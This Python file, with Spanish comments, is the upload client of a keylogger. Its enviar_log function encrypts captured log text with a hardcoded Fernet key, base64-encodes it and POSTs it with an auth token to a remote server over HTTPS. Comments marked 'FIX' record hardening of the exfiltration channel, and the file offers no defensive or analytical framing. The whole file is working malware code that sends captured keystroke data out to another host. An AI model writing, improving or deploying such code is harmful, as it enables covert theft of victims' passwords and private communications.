# cliente.py
import base64
import os
import requests
from cryptography.fernet import Fernet

# ⚠️ Tu clave Fernet real
CLAVE = b"1wmX9QfdSjAc9CSr4uOP0MqqLhgszf_NyO0Aw7iaIuI="

# >>> FIX: HTTPS en vez de HTTP
URL_SERVIDOR = "https://192.168.40.14:5000/upload"

# >>> FIX: token desde variable de entorno (con fallback)
TOKEN_SECRETO = os.environ.get(
    "KEYLOGGER_TOKEN",
    "cambia_esto_por_algo_largo_y_aleatorio_12345"
)

# >>> FIX: ruta al certificado (relativa a este archivo)
CERT_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "cert.pem"
)

fernet = Fernet(CLAVE)


def enviar_log(contenido: str, url: str = URL_SERVIDOR, timeout: int = 5) -> bool:
    """
    Cifra el contenido con Fernet, lo codifica en base64
    y lo envía al servidor vía HTTPS.
    """
    if not contenido or not contenido.strip():
        return True

    try:
        # 1. Cifrar
        contenido_bytes = contenido.encode("utf-8")
        cifrado = fernet.encrypt(contenido_bytes)

        # 2. Base64
        cifrado_b64 = base64.b64encode(cifrado).decode("utf-8")

        # 3. POST por HTTPS, validando el certificado
        r = requests.post(
            url,
            json={"contenido": cifrado_b64},
            headers={"X-Auth-Token": TOKEN_SECRETO},
            timeout=timeout,
            verify=CERT_PATH,     # >>> FIX: valida cert.pem
        )

        if r.status_code == 200:
            return True
        print(f"[!] Servidor respondió {r.status_code}: {r.text[:120]}")
        return False

    except requests.exceptions.SSLError as e:
        print(f"[!] Error SSL (¿certificado incorrecto?): {e}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[!] Error de red al enviar: {e}")
        return False
    except Exception as e:
        print(f"[!] Error inesperado al enviar: {e}")
        return False